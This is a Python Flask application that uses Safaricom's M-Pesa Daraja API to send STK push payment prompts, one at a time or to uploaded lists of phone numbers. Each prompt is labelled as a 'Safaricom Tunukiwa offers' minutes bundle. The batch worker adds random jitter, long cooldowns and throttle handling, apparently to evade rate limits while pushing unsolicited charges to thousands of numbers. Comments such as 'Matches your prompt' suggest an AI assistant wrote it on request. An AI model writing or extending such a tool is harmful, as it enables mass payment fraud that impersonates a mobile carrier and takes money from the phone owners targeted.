import os
import base64
import time
import threading
import random
from datetime import datetime
import requests
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# CONFIGURATION
CONSUMER_KEY = os.getenv("DARAJA_CONSUMER_KEY")
CONSUMER_SECRET = os.getenv("DARAJA_CONSUMER_SECRET")
SHORTCODE = os.getenv("DARAJA_SHORTCODE", "174379")
PASSKEY = os.getenv("DARAJA_PASSKEY")
CALLBACK_URL = os.getenv("DARAJA_CALLBACK_URL")

# 1. OFFERS LIST
OFFERS = [
    {"id": "tunukiwa_100", "price": 10, "mins": 100, "duration": "24 Hours"},
    {"id": "tunukiwa_250", "price": 20, "mins": 250, "duration": "24 Hours"},
    {"id": "tunukiwa_600", "price": 50, "mins": 600, "duration": "24 Hours"},
]

# Storage for progress tracking
batch_status = {"total": 0, "current": 0, "is_running": False, "status": "Idle", "logs": []}

# --- HELPER FUNCTIONS ---

def get_access_token():
    api_url = "https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get(api_url, auth=(CONSUMER_KEY.strip(), CONSUMER_SECRET.strip()), headers=headers)
        r.raise_for_status()
        return r.json().get('access_token')
    except:
        return None

def generate_password(timestamp):
    return base64.b64encode((SHORTCODE + PASSKEY + timestamp).encode()).decode('utf-8')

# --- BACKGROUND BATCH WORKER ---

def process_massive_batch(phone_numbers, amount):
    global batch_status
    batch_status["is_running"] = True
    batch_status["total"] = len(phone_numbers)
    batch_status["current"] = 0
    batch_status["status"] = "Processing"
    batch_status["logs"] = [] 

    access_token = get_access_token()
    stk_url = "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
    
    for phone in phone_numbers:
        clean_phone = phone.strip()
        if clean_phone.startswith("0"): clean_phone = "254" + clean_phone[1:]
        
        # Token Refresh Logic
        if batch_status["current"] % 500 == 0:
            access_token = get_access_token()

        # Cooldown Logic (15 min break every 1000 numbers)
        if batch_status["current"] > 0 and batch_status["current"] % 1000 == 0:
            batch_status["status"] = "Cooling down (15 min break)"
            time.sleep(900) 
            batch_status["status"] = "Processing"

        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
        
        # --- BATCH PROMPT UPDATE ---
        payload = {
            "BusinessShortCode": SHORTCODE,
            "Password": generate_password(timestamp),
            "Timestamp": timestamp,
            "TransactionType": "CustomerPayBillOnline",
            "Amount": 10, 
            "PartyA": clean_phone,
            "PartyB": SHORTCODE,
            "PhoneNumber": clean_phone,
            "CallBackURL": CALLBACK_URL,
            "AccountReference": "100MINS-24H",      # Matches your prompt
            "TransactionDesc": "Safaricom Tunukiwa offers" # Matches your prompt
        }

        current_time = datetime.now().strftime('%H:%M:%S')
        try:
            response = requests.post(stk_url, json=payload, headers=headers, timeout=10)
            if response.status_code == 200:
                batch_status["logs"].append({"phone": clean_phone, "status": "Sent", "time": current_time})
            elif response.status_code == 429:
                batch_status["status"] = "Throttled - Sleeping 10s"
                time.sleep(10)
                batch_status["status"] = "Processing"
            else:
                batch_status["logs"].append({"phone": clean_phone, "status": "Error", "time": current_time})
        except:
            batch_status["logs"].append({"phone": clean_phone, "status": "Failed", "time": current_time})
        
        batch_status["current"] += 1
        time.sleep(0.2 + random.uniform(0.05, 0.15))

    batch_status["is_running"] = False
    batch_status["status"] = "Complete"

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html', offers=OFFERS)

@app.route('/batch')
def batch_page():
    return render_template('batch.html')

@app.route('/initiate_payment', methods=['POST'])
def initiate_payment():
    data = request.get_json()
    phone = data.get('phone', '')
    offer_id = data.get('offer_id', '')
    
    amount = 10
    for offer in OFFERS:
        if offer['id'] == offer_id:
            amount = offer['price']
            break

    clean_phone = phone.strip()
    if clean_phone.startswith("0"): clean_phone = "254" + clean_phone[1:]
    
    access_token = get_access_token()
    stk_url = "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    
    # --- SINGLE PURCHASE PROMPT UPDATE ---
    payload = {
        "BusinessShortCode": SHORTCODE,
        "Password": generate_password(timestamp),
        "Timestamp": timestamp,
        "TransactionType": "CustomerPayBillOnline",
        "Amount": amount,
        "PartyA": clean_phone,
        "PartyB": SHORTCODE,
        "PhoneNumber": clean_phone,
        "CallBackURL": CALLBACK_URL,
        "AccountReference": "100MINS-24H",              # Matches your prompt
        "TransactionDesc": "Safaricom Tunukiwa offers"   # Matches your prompt
    }

    try:
        response = requests.post(stk_url, json=payload, headers=headers)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "STK Prompt sent!"})
        return jsonify({"status": "error", "message": "Safaricom error"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/upload_batch', methods=['POST'])
def upload_batch():
    if 'file' not in request.files: return "No file", 400
    file = request.files['file']
    content = file.read().decode('utf-8')
    phone_numbers = [n.strip() for n in content.split('\n') if n.strip()]

    thread = threading.Thread(target=process_massive_batch, args=(phone_numbers, 10))
    thread.start()
    return jsonify({"status": "started"})

@app.route('/batch_progress')
def get_progress():
    return jsonify(batch_status)

# --- PORT CONFIG ---
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)